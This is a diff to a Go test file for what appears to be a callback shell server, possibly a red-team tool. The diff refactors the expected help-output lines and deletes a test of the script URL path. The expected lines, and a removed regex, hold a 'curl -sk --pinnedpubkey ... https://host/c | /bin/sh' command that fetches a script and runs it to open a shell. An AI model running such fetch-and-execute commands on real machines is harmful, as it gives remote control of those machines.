@@ -5,7 +5,7 @@ package hsrv
  * Tests for hserv.go
  * By J. Stuart McMurray
  * Created 20240324
- * Last Modified 20241210
+ * Last Modified 20241217
  */
 
 import (
@@ -20,7 +20,6 @@ import (
 	"net"
 	"net/http"
 	"reflect"
-	"regexp"
 	"slices"
 	"strings"
 	"sync"
@@ -153,35 +152,37 @@ func newTestServerMaybeWithDir(t *testing.T, makeFDir bool) (
 			Line:        "\n",
 			NoTimestamp: true,
 		},
-	}, {
-		want: opshell.CLine{
+	}}
+
+	for _, addr := range []string{
+		cbAddrs[0],
+		net.JoinHostPort(
+			cbAddrs[1],
+			listenPort,
+		),
+		s.l.Addr().String(),
+	} {
+		fileWCLs = append(fileWCLs, wantCLine{want: opshell.CLine{
 			Color: ScriptColor,
 			Line: fmt.Sprintf(
-				CurlFormat+FileSuffix,
+				"curl -sk "+
+					"--pinnedpubkey sha256//%s "+
+					"https://%s/c | /bin/sh",
 				s.l.Fingerprint,
-				cbAddrs[0],
+				addr,
 			),
 			NoTimestamp: true,
-		},
-	}, {
+		}})
+	}
+	fileWCLs = append(fileWCLs, wantCLine{want: opshell.CLine{
+		Color:       ScriptColor,
+		Line:        "\n",
+		NoTimestamp: true,
+	}})
+	shellWCLs := []wantCLine{{
 		want: opshell.CLine{
 			Color: ScriptColor,
-			Line: fmt.Sprintf(
-				CurlFormat+FileSuffix,
-				s.l.Fingerprint,
-				net.JoinHostPort(cbAddrs[1], listenPort),
-			),
-			NoTimestamp: true,
-		},
-	}, {
-		want: opshell.CLine{
-			Color: ScriptColor,
-			Line: fmt.Sprintf(
-				CurlFormat+FileSuffix,
-				s.l.Fingerprint,
-				s.l.Addr().String(),
-			),
-			NoTimestamp: true,
+			Line:  "To get a shell:",
 		},
 	}, {
 		want: opshell.CLine{
@@ -190,40 +191,31 @@ func newTestServerMaybeWithDir(t *testing.T, makeFDir bool) (
 			NoTimestamp: true,
 		},
 	}}
-	shellWCLs := []wantCLine{{
-		want: opshell.CLine{
+	for _, addr := range []string{
+		cbAddrs[0],
+		net.JoinHostPort(
+			cbAddrs[1],
+			listenPort,
+		),
+		s.l.Addr().String(),
+	} {
+		shellWCLs = append(shellWCLs, wantCLine{want: opshell.CLine{
 			Color: ScriptColor,
-			Line:  "To get a shell:",
-		},
-	}, {
-		want: opshell.CLine{
-			Color: ScriptColor,
-			Line: "\n" + strings.Join([]string{
-				fmt.Sprintf(
-					CurlFormat+ShellSuffix,
-					s.l.Fingerprint,
-					cbAddrs[0],
-					crstemplate.DefaultURLPathScript,
-				),
-				fmt.Sprintf(
-					CurlFormat+ShellSuffix,
-					s.l.Fingerprint,
-					net.JoinHostPort(
-						cbAddrs[1],
-						listenPort,
-					),
-					crstemplate.DefaultURLPathScript,
-				),
-				fmt.Sprintf(
-					CurlFormat+ShellSuffix,
-					s.l.Fingerprint,
-					s.l.Addr().String(),
-					crstemplate.DefaultURLPathScript,
-				),
-			}, "\n") + "\n\n",
+			Line: fmt.Sprintf(
+				"curl -sk "+
+					"--pinnedpubkey sha256//%s "+
+					"https://%s/c | /bin/sh",
+				s.l.Fingerprint,
+				addr,
+			),
 			NoTimestamp: true,
-		},
-	}}
+		}})
+	}
+	shellWCLs = append(shellWCLs, wantCLine{want: opshell.CLine{
+		Color:       ScriptColor,
+		Line:        "\n",
+		NoTimestamp: true,
+	}})
 	wantCLines := make(
 		[]wantCLine,
 		0,
@@ -466,54 +458,6 @@ func TestServer_OneShell(t *testing.T) {
 		{Msg: iobroker.LMDisconnected, Direction: "output"}: 1,
 	})
 	cl.ExpectEmpty(t)
-}
-
-// Make sure we can set the script URL in the output.
-func TestServer_SetScriptURLPath(t *testing.T) {
-	var (
-		_, sl = chanlog.New()
-		want  = "kittens"
-	)
-	s, err := New(
-		sl,
-		"127.0.0.1:0",
-		"",
-		"",
-		nil,
-		nil,
-		nil,
-		"",
-		nil,
-		false,
-		true,
-		crstemplate.URLPaths{
-			In:     "up_In",
-			InOut:  "up_InOut",
-			Out:    "up_Out",
-			Script: want,
-		},
-	)
-	if nil != err {
-		t.Fatalf("New returned error: %s", err)
-	}
-
-	/* Extract our URL bit, hopefully. */
-	if ms := regexp.MustCompile(
-		`curl -sk --pinnedpubkey sha256//[a-zA-Z0-9+/]+= ` +
-			`https://127.0.0.1:\d+/(\S+) \| /bin/sh`,
-	).FindStringSubmatch(s.cbHelp); 2 != len(ms) {
-		t.Errorf("Could not parse callback help line: %q", s.cbHelp)
-	} else if got := ms[1]; got != want {
-		t.Errorf(
-			"Incorrect script path:\n"+
-				"ms[0]: %q\nms[1]: %q\n"+
-				" got: %s\n"+
-				"want: %s",
-			ms[0], ms[1],
-			got,
-			want,
-		)
-	}
 }
 
 func TestNewUnsetURLPath(t *testing.T) {
